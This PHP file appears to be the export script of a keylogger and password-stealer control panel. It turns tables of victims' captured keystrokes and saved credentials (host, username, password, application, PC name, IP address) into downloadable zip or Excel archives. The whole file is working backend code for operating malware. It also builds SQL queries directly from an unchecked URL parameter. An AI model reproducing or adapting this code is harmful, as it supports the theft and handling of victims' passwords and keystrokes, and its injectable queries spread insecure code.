<?php
session_start();
if (!isset($_SESSION['logged_in']) 
	|| $_SESSION['logged_in'] !== true) {
	header('Location: login.php');
	exit;
}

ini_set('max_execution_time', 600);
ini_set('memory_limit','1024M');

if(!isset($_GET['type']) || !isset($_GET['mime'])){
	exit;
}
require_once ("config.php");
require_once('mysqli.db.php');
$db = new DB($mysql_user,$mysql_password, $mysql_database, $mysql_host);

$mime = $_GET['mime'];

if($mime == "zip")
	$dir = tempdir();
else
	$dir = "";

if($_GET['type'] == 'logs' && $mime == "zip"){
	$stmt = $db->select('select * from ' . $_GET['type'] . ' GROUP BY hwid', array(), array());
	while($row = $stmt->fetch_array()){
		mkdir($dir . '/' . preg_replace('/[^\w-]/', '_', $row['pc_name']) . '_' . $row['hwid'], 0777, true);
	}
}

$stmt = $db->select('select * from ' . $_GET['type'], array(), array());

if($stmt){
	if($_GET['type'] == 'logs'){
		if($stmt->num_rows > 1){
			if($mime == 'zip'){
				while($row = $stmt->fetch_array()){
					$filename = date("Y_m_d_H_i_s", strtotime($row['server_time'])) . '_' . $row['log_id'] . ".html";
					$filepath = $dir . "/" . preg_replace('/[^\w-]/', '_', $row['pc_name']) . '_' . $row['hwid'] . '/'. $filename;
					$content = "<html>";
					$content .= "PC Name: " . $row['pc_name'] . "<br />" . "Local Time: " . $row['time'] . "<br />" . "Server Time: " . $row['server_time'] . "<br />" . "IP Address: " . $row['ip_addres'];
					$content .= "<hr>" . urldecode($row['log']);
					$content .= "</html>";
					
					if (!file_exists($filepath)) { $handle = fopen($filepath,'w+'); fwrite($handle,$content); fclose($handle); }
				}
				
				zipData($dir, $dir. '/backup.zip');
				
				if(file_exists($dir . '/backup.zip'))
					echo json_encode(array("success" => 1, "path" => $dir . '/backup.zip'));
				else
					echo json_encode(array("success" => 0, "path" => ""));
			}elseif($mime == 'xls'){
				$data = array();
				$data[] = array("ID", "PC Name", "Server Time", "Local Time", "IP Address", "Log");
				while($row = $stmt->fetch_array()){
					$data[] = array($row['log_id'], $row['pc_name'], $row['server_time'], $row['time'], $row['ip_addres'], $row['log']);
				}
				xmlData($data, "Keystrokes");
			}
		}
	}elseif($_GET['type'] == 'passwords'){
		if($stmt->num_rows > 1){
			if($mime == 'zip'){
				$filename = "Password_Exports_" . date("Y_m_d_H_i_s") . ".html";
				$filepath = $dir . '/'. $filename;
				$content = "<html>";
				$content .= "Password Exports<hr><br>";
				
				while($row = $stmt->fetch_array()){
					$content .= "Host/URL: " . $row['host'] . "<br />";
					$content .= "Username: " . $row['username'] . "<br />";
					$content .= "Password: " . $row['pwd'] . "<br />";
					$content .= "Application: " . $row['client'] . "<br />";
					$content .= "PC Name: " . $row['pc_name'] . "<br />";
					$content .= "<hr>";
				}
				
				if (!file_exists($filepath)) { $handle = fopen($filepath,'w+'); fwrite($handle,$content); fclose($handle); }
				
				$content .= "</html>";
				
				zipData($dir, $dir . '/backup.zip');
				
				if(file_exists($dir . '/backup.zip'))
					echo json_encode(array("success" => 1, "path" => $dir . '/backup.zip'));
				else
					echo json_encode(array("success" => 0, "path" => ""));
			
			}elseif($mime == 'xls'){
				$data = array();
				$data[] = array("ID", "PC Name", "Host/URL", "Username", "Password", "Application");
				while($row = $stmt->fetch_array()){
					$data[] = array($row['password_id'], $row['pc_name'], $row['host'], $row['username'], $row['pwd'], $row['client']);
				}
				xmlData($data, "Passwords");
			}
		}
	}
}
function xmlData($data = array(), $table){
	
	require dirname(__FILE__) . '/php-excel.class.php';
	$xls = new Excel_XML;
	$xls->addWorksheet($table, $data);
	$xls->sendWorkbook($table . '.xml');

}
function zipData($source, $zipTo) {
    if (extension_loaded('zip') === true) {
        if (file_exists($source) === true) {
            $zip = new ZipArchive();
            if ($zip->open($zipTo, ZIPARCHIVE::CREATE) === true) {
                $source = realpath($source);
				if (is_dir($source) === true) {
					$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

					foreach ($files as $file) {
						$file = realpath($file);
						if (is_dir($file) === true && $file != realpath($source . '/..')) {
							$zip->addEmptyDir(str_replace($source . '\\', '', $file . '\\'));
						} else if (is_file($file) === true) {
							$zip->addFile($file, str_replace($source . '\\', '', $file));
						}
					}
				} else if (is_file($source) === true) {
						$zip->addFile($source, basename($source));
				}
			}
            return $zip->close();
        }
    }
    return false;
}
function tempdir() {
    $name = uniqid();
    $dir =  'export/' . $name;
    if(!file_exists($dir)) {
        if(mkdir($dir, 0777, true) === true) {
            return $dir;
        }
    }
    return tempdir();
}
?>